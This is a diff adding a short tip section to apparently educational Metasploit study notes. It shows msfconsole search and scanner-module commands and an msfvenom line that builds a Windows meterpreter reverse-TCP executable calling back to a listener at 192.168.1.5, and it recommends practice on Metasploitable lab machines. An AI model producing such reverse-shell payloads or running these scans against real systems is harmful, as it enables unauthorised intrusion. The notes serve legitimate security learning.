@@ -56,3 +56,25 @@ From a defender's side, understanding Metasploit helps security teams validate t
 - msfvenom: Metasploit's standalone payload generator for creating custom executables and shellcode
 - RHOSTS / LHOST: target IP (RHOSTS) and attacker's listening IP (LHOST) — core options set before running an exploit
 - Auxiliary Module: a module used for scanning, brute forcing, or information gathering rather than direct exploitation
+
+## One Tip / Tool
+
+Tool: `msfconsole` and `msfvenom` — both included in every Metasploit installation
+
+```bash
+# search modules by keyword
+search eternalblue
+search type:auxiliary scanner smb
+
+# use msfvenom standalone to generate payloads (used in day 20 RATs)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
+
+# list all payload formats available
+msfvenom --list formats
+
+# useful auxiliary modules for recon before exploitation
+use auxiliary/scanner/portscan/tcp
+use auxiliary/scanner/smb/smb_version
+```
+
+Practice Metasploit safely on **Metasploitable 2/3** — intentionally vulnerable virtual machines built specifically to practice every stage of the Metasploit workflow, from scanning to exploitation to post-exploitation, in a fully legal lab environment.
